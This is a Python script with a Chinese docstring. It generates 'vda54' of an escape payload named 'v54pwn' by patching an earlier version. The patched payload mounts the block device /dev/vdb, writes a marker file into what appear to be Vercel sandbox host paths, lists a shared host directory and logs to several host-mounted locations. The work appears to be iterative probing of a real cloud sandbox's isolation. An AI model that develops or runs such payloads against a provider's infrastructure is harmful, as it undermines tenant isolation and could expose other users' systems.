# -*- coding: utf-8 -*-
"""生成 vda54: 基于 vda53, 多通道日志 + mount 诊断"""
import re

src = open(r'D:\scan\skills\non-traditional-vuln-hunting\vda53_iso_ctr_vdb_snap_guest.py', encoding='utf-8').read()
src = src.replace('v53pwn', 'v54pwn')
src = src.replace('v53c.out', 'v54c.out').replace('v53m.out', 'v54m.out')
src = src.replace('v53_payload.py', 'v54_payload.py')

old_log = """def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    try:
        open(OUT, 'a', encoding='utf-8', errors='replace').write(line + '\\n')
    except Exception:
        pass
    try:
        open('/mnt/root/v54c.out', 'a', encoding='utf-8', errors='replace').write(line + '\\n')
    except Exception:
        pass
    try:
        print(line, flush=True)
    except Exception:
        pass"""
new_log = """def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in ['/mnt/volumes/run/vercel/share/v54c.out', '/mnt/run/vercel/share/v54c.out',
              '/mnt/g/vercel/sandbox/v54c.out', '/mnt/root/v54c.out']:
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass"""
assert old_log in src, 'old_log not found'
src = src.replace(old_log, new_log)

old_main = """def main():
    log('payload start pid=%d' % os.getpid())
    g = '/mnt/g/vercel/sandbox'
    try:
        log('g check: %s' % (os.path.isdir(g) and 'DIR_OK' or 'NO_DIR'))
        open(g + '/_ctr_marker', 'w').write('hello-from-ctr')
        log('g write: OK')
    except Exception as e:
        log('g write ERR %s' % e)"""
new_main = """def main():
    log('payload start pid=%d' % os.getpid())
    try:
        import subprocess as sp
        r = sp.run(['mount', '/dev/vdb', '/mnt/g2'], capture_output=True)
        log('mount vdb /mnt/g2 rc=%d err=%s' % (r.returncode, r.stderr[:120]))
    except Exception as e:
        log('mount vdb EXC %s' % e)
    g = '/mnt/g/vercel/sandbox'
    try:
        log('g check: %s' % (os.path.isdir(g) and 'DIR_OK' or 'NO_DIR'))
        open(g + '/_ctr_marker', 'w').write('hello-from-ctr')
        log('g write: OK')
    except Exception as e:
        log('g write ERR %s' % e)
    sh = '/mnt/volumes/run/vercel/share'
    try:
        log('share check: %s' % (os.path.isdir(sh) and 'DIR_OK' or 'NO_DIR'))
        log('share ls: %s' % (sorted(os.listdir(sh)) if os.path.isdir(sh) else 'N/A'))
    except Exception as e:
        log('share EXC %s' % e)"""
assert old_main in src, 'old_main not found'
src = src.replace(old_main, new_main)

open(r'D:\scan\skills\non-traditional-vuln-hunting\vda54_iso_ctr_multi_log_guest.py', 'w', encoding='utf-8').write(src)
print('written', len(src))
